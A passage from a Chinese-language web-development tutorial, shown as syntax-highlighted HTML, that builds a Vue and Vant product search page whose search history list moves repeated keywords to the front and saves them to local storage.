#9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-search</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">show-action</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"请输入搜索关键词"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">clearable</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #D4D4D4"> #</span><span style="color: #9CDCFE">action</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">搜索</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-search</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 搜索历史 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"search-history"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4"> &gt; </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"title"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">最近搜索</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"delete-o"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">size</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"16"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"list-item"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">          :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">          @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">push</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'/searchlist'</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          {{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> }}</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"SearchIndex"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">historyList:</span><span style="color: #D4D4D4"> [</span><span style="color: #CE9178">"炒锅"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"电视"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"冰箱"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"手机"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"自行车"</span><span style="color: #D4D4D4">],</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.search</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.searchBtn</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-search__action</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#c21401</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">.van-icon-arrow-left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.title</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">40px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">15px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.list</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex-start</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex-wrap</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">wrap</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">gap</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.list-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">25%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">7px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">15px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">13px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">hidden</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">white-space</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">nowrap</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">text-overflow</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">ellipsis</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h3 id="历史记录管理"><a class="markdownIt-Anchor" href="#历史记录管理"></a> 历史记录管理</h3><p>目标：构建搜索页的静态布局，完成历史记录的管理<br>需求分析：</p><ol><li>搜索历史基本渲染</li><li>点击搜索 (添加历史)</li></ol><p>添加历史说明：</p><p>点击搜索按钮或底下历史记录，都能进行搜索</p><ol><li>若之前没有相同搜索关键字，则直接追加到最前面</li><li>若之前已有相同搜索关键字，将该原有关键字移除，再追加（相当于置顶）</li></ol><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"search"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"商品搜索"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">left-arrow</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click-left</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">$router</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">go</span><span style="color: #D4D4D4">(-</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-search</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">v-model</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">search</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      @</span><span style="color: #9CDCFE">search</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #DCDCAA">goSearch</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">search</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">show-action</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">placeholder</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"请输入搜索关键词"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">clearable</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #D4D4D4"> #</span><span style="color: #9CDCFE">action</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #DCDCAA">goSearch</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">search</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">搜索</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">van-search</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 搜索历史 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"search-history"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">length</span><span style="color: #D4D4D4"> &gt; </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"title"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">最近搜索</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"delete-o"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">clearHistory</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">size</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"16"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"list-item"</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">          :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">          @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #DCDCAA">goSearch</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">)</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          {{ </span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> }}</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">getHistory</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">setHistory</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/utils/storage"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">name:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"SearchIndex"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">search:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">historyList:</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getHistory</span><span style="color: #D4D4D4">(),</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">goSearch</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">searchContent</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 判断输入的搜索词是否已经在historyList中</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">index</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">indexOf</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">searchContent</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4"> !== -</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 说明存在，则将其进行删除</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">splice</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">index</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">); </span><span style="color: #6A9955">// splice语法：splice(index, howMany, item1, ....., itemX)</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 将搜索词添加到historyList的最前面</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">historyList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">unshift</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">searchContent</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #DCDCAA">setHistory</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: 